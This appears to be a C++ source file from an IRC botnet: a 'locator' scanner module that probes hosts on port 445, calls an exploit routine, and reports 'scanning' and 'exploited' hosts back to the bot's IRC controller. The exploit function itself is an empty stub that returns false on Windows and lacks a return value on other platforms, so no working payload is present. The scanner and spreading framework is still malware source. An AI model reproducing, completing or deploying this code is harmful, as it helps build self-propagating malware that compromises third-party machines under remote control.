
#include "main.h"
#include "locscanner.h"
#include "mainctrl.h"
#include "utility.h"

/*
		Locator Scanner starts here
		scans for locator exploit
*/

CScannerLocator::CScannerLocator() { m_sScannerName.Assign("locator"); }
void CScannerLocator::StartScan(const CString &sHost)
{	bool bSuccess=false;

#ifdef WIN32
	if(ScanPort(sHost.CStr(), 445))
	{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: scanning ip %s:445.", m_sScannerName.CStr(), sHost.CStr());
		bSuccess=Exploit(sHost); }
#endif

	// Success
	if(bSuccess) g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), \
		"%s: exploited ip %s.", m_sScannerName.CStr(), sHost.CStr()); }

bool CScannerLocator::Exploit(const CString &sHost)
{
#ifdef WIN32
	return false;
#endif
}

